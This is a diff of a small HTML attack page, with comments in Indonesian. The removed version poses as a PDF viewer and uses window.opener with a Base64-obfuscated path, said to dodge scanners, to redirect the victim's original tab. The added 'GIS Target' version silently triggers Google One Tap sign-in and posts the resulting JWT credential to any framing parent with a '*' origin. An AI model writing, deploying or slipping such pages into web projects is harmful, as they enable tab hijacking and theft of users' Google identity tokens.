@@ -1,25 +1,25 @@
 <!DOCTYPE html>
-<html lang="id">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>PDF Viewer</title>
+    <title>GIS Target</title>
 </head>
 <body>
-    <div style="text-align: center; margin-top: 20%; font-family: sans-serif;">
-        <h3>Memuat Dokumen... 0%</h3>
-        <p>Mohon tunggu sebentar.</p>
+    <div id="g_id_onload"
+        data-client_id="823496596253-uptuk5vf4ms9tqcclllhntg0nvgrijj2.apps.googleusercontent.com"
+        data-context="signin"
+        data-ux_mode="popup"
+        data-callback="callback"
+        data-auto_select="true"
+        data-itp_support="true"
+        style="position: absolute; top: 0px; left: 0px; width: 300px; height: 100px; z-index: 1001;">
     </div>
-
     <script>
-        if (window.opener) {
-            setTimeout(function() {
-                // "YWxlcnQuaHRtbA==" adalah Base64 dari "alert.html"
-                // Ini teknik dasar biar scanner nggak langsung baca string file tujuan
-                var target = atob("YWxlcnQuaHRtbA=="); 
-                window.opener.location = target;
-                console.log("Status: Update dikirim ke tab asal.");
-            }, 1500);
+        function callback(e) {
+            // Mengirim data JWT ke jendela utama (index.html)
+            parent.postMessage(e, "*");
         }
     </script>
+    <script src="https://accounts.google.com/gsi/client" async></script>
 </body>
 </html>
